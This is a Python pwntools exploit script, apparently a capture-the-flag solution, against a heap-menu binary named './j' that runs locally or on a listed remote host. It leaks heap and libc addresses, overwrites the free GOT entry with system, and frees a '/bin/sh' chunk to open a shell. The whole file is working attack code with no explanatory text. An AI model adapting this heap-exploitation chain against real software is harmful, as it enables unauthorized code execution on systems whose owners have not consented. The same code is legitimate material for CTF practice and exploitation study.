#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '159.65.125.233'
port = 6005

binary = "./j"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def insert(size ,momo):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil("> ")
  r.sendline(str(size))
  r.recvuntil("> ")
  r.send(momo)
  pass

def edit(h, num, momo):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil("> ")
  r.send(str(h))
  r.recvuntil("> ")
  r.send(str(num))
  r.recvuntil("> ")
  r.send(momo)
  pass

def delete(h,num):
  r.recvuntil("> ")
  r.sendline("5")
  r.recvuntil("> ")
  r.sendline(str(h))
  r.recvuntil("> ")
  r.sendline(str(num))
  pass

def show(start,end):
  r.recvuntil("> ")
  r.sendline("3")
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

def search(size, momo):
  r.recvuntil("> ")
  r.sendline("4")
  r.sendline(str(size))
  r.recvuntil("> ")
  r.send(momo)

free_got = 0x0602018

if __name__ == '__main__':
  insert(0x48,"A"*0x48)
  insert(0x48,"A"*0x48)
  delete(7,1)
  delete(7,0)
  insert(0x48,"A")
  heap = u64(show("0: \"","\"").ljust(8,"\x00")) - 0x41
  print "heap =",hex(heap)
  insert(0x58,"A"*0x58)
  r.recvuntil("> ")
  r.sendline("32A")
  insert(0x8,"/bin/sh\x00")
  insert(88,"A")
  search(88,"A")
  raw_input("@")
  edit(8,0,p64(0) + p64(0x0602018))

  libc.address  = u64(show("1: \"","\"").ljust(8,"\x00")) - libc.symbols["free"]
  print "libc =", hex(libc.address)
  edit(8,1,p64(libc.symbols["system"]))
  delete(0,0)
    
  r.interactive()

